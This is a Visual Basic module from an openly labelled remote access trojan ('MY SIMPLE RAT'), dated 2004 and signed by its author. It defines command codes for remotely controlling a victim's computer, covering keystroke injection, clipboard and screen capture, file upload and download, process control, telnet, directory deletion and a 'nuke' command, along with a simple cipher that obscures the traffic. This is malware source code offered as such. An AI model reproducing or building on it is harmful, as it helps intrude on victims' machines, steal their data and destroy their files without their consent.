Attribute VB_Name = "CommandModule"
'#########################################'
'#########################################'
'##                                     ##'
'##          MY SIMPLE RAT :)           ##'
'##                                     ##'
'##             28.11.2004              ##'
'##                                     ##'
'##   ~ RIPPING SUCKX ~                 ##'
'##                                     ##'
'##       -> SNIPER109 <-               ##'
'##                                     ##'
'## irc.quakenet.org @ #sniper109       ##'
'#########################################'
'#########################################'

Public Const Splitter = "$EOF$"
Public Const MasterSplit = "ª«•"
Public Const CMD_SERVERLOG = "A01"
Public Const CMD_LOGIN = "A02"
Public Const CMD_CHAT = "B01"
Public Const CMD_SENDKEYS = "C09"
Public Const CMD_INPUTBOX = "B50"
Public Const CMD_MSG = "B57"
Public Const CMD_FAV = "X01"
Public Const CMD_SERVICES = "X08"
Public Const CMD_SHARE = "X04"
Public Const CMD_USER = "S01"
Public Const CMD_SHARE2 = "X11"
Public Const CMD_USER2 = "X12"
Public Const CMD_PRINT = "Y05"
Public Const CMD_CLIP = "Q01"
Public Const CMD_FILE = "Q02"
Public Const CMD_FILEMOD = "AA0"
Public Const CMD_PROCESS = "XYX"
Public Const CMD_SERVERINFO = "X00"
Public Const CMD_SERVER = "AAA"
Public Const CMD_TELNET = "F18"
Public Const CMD_NUKE = "F19"
Public Const CMD_DELDIR = "AXY"
Public Const CMD_DOWNLOAD = "XX3"
Public Const CMD_UPLOAD = "UP9"
Public Const CMD_SCREEN = "SC0"
Public Function Encode(STC$)
Dim pw As String: pw = "0": j = 0: ecrypt$ = ""
For i = 1 To Len(STC$)
j = j + 1
If j > Len(pw$) Then j = 1
vz = Asc(Mid$(STC$, i, 1)) + Asc(Mid$(pw$, j, 1))
If vz > 255 Then vz = vz - 256
ecrypt$ = ecrypt$ + Chr$(vz)
Next
Encode = ecrypt$
End Function
Public Function Decode(std$)
Dim pw As String: pw = "0": j = 0: ecrypt$ = ""
For i = 1 To Len(std$)
j = j + 1
If j > Len(pw$) Then j = 1
A = Asc(Mid$(std$, i, 1)) - Asc(Mid$(pw$, j, 1))
If A < 0 Then A = 256 + A
ecrypt$ = ecrypt$ + Chr$(A)
Next
Decode = ecrypt$
End Function
